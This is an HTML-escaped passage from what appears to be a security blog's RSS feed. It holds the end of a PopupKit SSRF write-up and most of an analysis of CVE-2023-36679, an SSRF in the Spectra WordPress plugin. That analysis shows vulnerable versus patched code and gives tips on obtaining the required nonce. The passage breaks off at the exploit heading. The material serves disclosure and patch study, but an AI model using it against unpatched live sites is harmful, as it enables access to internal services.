data-thumbnail=&#34;/posts/2025-10-27-cve-2025-10861/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Content read from local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-27-cve-2025-10861/result.png&#39; alt=&#34;Result&#34; height=&#34;398&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content read from local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Versions &lt;strong&gt;≤ 2.1.4&lt;/strong&gt; of &lt;strong&gt;PopupKit&lt;/strong&gt; are vulnerable to &lt;strong&gt;SSRF&lt;/strong&gt;: the &lt;code&gt;/wp-json/pbb/v1/live-preview&lt;/code&gt; endpoint allows &lt;strong&gt;anonymous&lt;/strong&gt; users to call &lt;code&gt;fetch_external_content()&lt;/code&gt; with a client-provided &lt;code&gt;url&lt;/code&gt;; the function uses &lt;code&gt;wp_remote_get()&lt;/code&gt; and returns the response body directly, enabling access to internal services. Version &lt;strong&gt;2.1.5&lt;/strong&gt; switched to &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; and restricted access to admin-only, which reduces risk.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update&lt;/strong&gt; to &lt;strong&gt;2.1.5+&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Do not trust client URLs&lt;/strong&gt; — validate/allowlist before fetching.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Use &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;&lt;/strong&gt; and add additional checks (redirects, DNS).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Do not use &lt;code&gt;permission_callback =&amp;gt; __return_true&lt;/code&gt;&lt;/strong&gt;; restrict permissions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Do not return raw response bodies&lt;/strong&gt; unless necessary.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/popup-builder-block/vulnerability/wordpress-popup-builder-with-gamification-multi-step-popups-page-level-targeting-and-woocommerce-triggers-plugin-2-1-4-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress PopupKit Plugin &amp;lt;= 2.1.4 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-36679 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-23-cve-2023-36679/</link>
      <pubDate>Thu, 23 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-23-cve-2023-36679/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;A Server Side Request Forgery (SSRF) vulnerability was discovered in the WordPress &lt;strong&gt;Spectra&lt;/strong&gt; plugin (previously named &lt;strong&gt;Ultimate Addons for Gutenberg&lt;/strong&gt;) affecting versions up to &lt;code&gt;2.6.6&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-36679&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-36679&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.6.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.6.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-addons-for-gutenberg/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Spectra Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Spectra&lt;/strong&gt;: &lt;strong&gt;2.6.6&lt;/strong&gt; (vulnerable) and &lt;strong&gt;2.6.7&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to check and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function template_importer() {&#x9;&#xA;    if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;    }&#xA;    // Verify Nonce.&#xA;    check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&#xA;    // other logic&#xA;    $api_args = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_args&amp;#39;,&#xA;        array(&#xA;            &amp;#39;timeout&amp;#39; =&amp;gt; 15,&#xA;        )&#xA;    );&#xA;    $api_uri = ( isset( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) ) ? esc_url_raw( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $request_params = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_params&amp;#39;,&#xA;        array(&#xA;            &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39;,&#xA;        )&#xA;    );&#xA;    $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;    // API Call.&#xA;    $response = wp_remote_get( $demo_api_uri, $api_args );&#xA;    // other logic&#xA;    $data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;&#xA;    wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In version 2.6.6, the &lt;code&gt;template_importer()&lt;/code&gt; function takes the &lt;code&gt;api_uri&lt;/code&gt; parameter directly from &lt;code&gt;$_REQUEST&lt;/code&gt; and uses that value to send an HTTP request via &lt;code&gt;wp_remote_get()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Because there is no validation or source restriction, an attacker can supply an arbitrary URL to force the server to make requests to internal addresses. This creates a &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function template_importer() {&#x9;&#xA;    if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;    }&#xA;    // Verify Nonce.&#xA;    check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&#xA;    // other logic&#xA;    $api_args = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_args&amp;#39;,&#xA;        array(&#xA;            &amp;#39;timeout&amp;#39; =&amp;gt; 15,&#xA;        )&#xA;    );&#xA;    $block_id   = isset( $_REQUEST[&amp;#39;id&amp;#39;] ) ? absint( $_REQUEST[&amp;#39;id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $block_data = get_option( &amp;#39;ast-block-templates_data-&amp;#39; . $block_id );&#xA;    $api_uri = null !== $block_data ? $block_data-&amp;gt;{&amp;#39;astra-page-api-url&amp;#39;} : &amp;#39;&amp;#39;;&#xA;    $request_params = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_params&amp;#39;,&#xA;        array(&#xA;            &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39;,&#xA;        )&#xA;    );&#xA;    $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;    // API Call.&#xA;    $response = wp_remote_get( $demo_api_uri, $api_args );&#xA;    // other logic&#xA;    $data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;&#xA;    wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch removed taking a URL directly from user input. Instead, the code only accepts a &lt;strong&gt;block ID&lt;/strong&gt; via &lt;code&gt;$_REQUEST[&#39;id&#39;]&lt;/code&gt; and retrieves the corresponding URL from the database (&lt;code&gt;wp_options&lt;/code&gt;) under the key &lt;code&gt;ast-block-templates_data-{id}&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Thus, the URL is constrained to records managed by the system, eliminating the ability for a user to provide an arbitrary path. This mechanism prevents SSRF and increases safety when performing server-side API calls.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;template_importer()&lt;/code&gt; requires the user to have privileges from &lt;strong&gt;Contributor&lt;/strong&gt; or higher&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;CSRF protection is implemented with a nonce named &lt;code&gt;_ajax_nonce&lt;/code&gt;; if the nonce does not match, the logic exits and returns an error.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;The disclosed vulnerability requires &lt;strong&gt;Contributor&lt;/strong&gt; privileges, so the &lt;code&gt;_ajax_nonce&lt;/code&gt; value is very likely present in the Admin UI code.&#xA;For vulnerabilities tied to Contributor privileges and post creation features, you can look for &lt;code&gt;_ajax_nonce&lt;/code&gt; by inspecting the post creation/edit UI in the admin (or searching the script/HTML generated by the Admin pages).&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/nonce.png&#34; title=&#34;_ajax_nonce in response&#34; data-thumbnail=&#34;/posts/2025-10-23-cve-2023-36679/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;_ajax_nonce&lt;/h2&gt;&lt;p&gt;_ajax_nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-23-cve-2023-36679/nonce.png&#39; alt=&#34;_ajax_nonce&#34; height=&#34;708&#34; width=&#34;1533&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;_ajax_nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;After verification steps, the code takes the &lt;code&gt;api_uri&lt;/code&gt; value directly from &lt;code&gt;$_REQUEST&lt;/code&gt;, runs it through &lt;code&gt;esc_url_raw()&lt;/code&gt;, appends query parameters, and performs an HTTP request using &lt;code&gt;wp_remote_get()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$api_uri = isset( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) ? esc_url_raw( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;$request_params = array( &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39; );&#xA;$demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;$response = wp_remote_get( $demo_api_uri, $api_args );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Finally it decodes the response and returns JSON with the &lt;code&gt;original_content&lt;/code&gt; key&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;template_importer()&lt;/code&gt; is registered as the callback for the action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_ast_block_templates_importer&amp;#39;, array( $this, &amp;#39;template_importer&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Meaning, when accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax/php&lt;/code&gt; with &lt;code&gt;action=ast_block_templates_importer&lt;/code&gt; the &lt;code&gt;template_importer()&lt;/code&gt; function is invoked.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  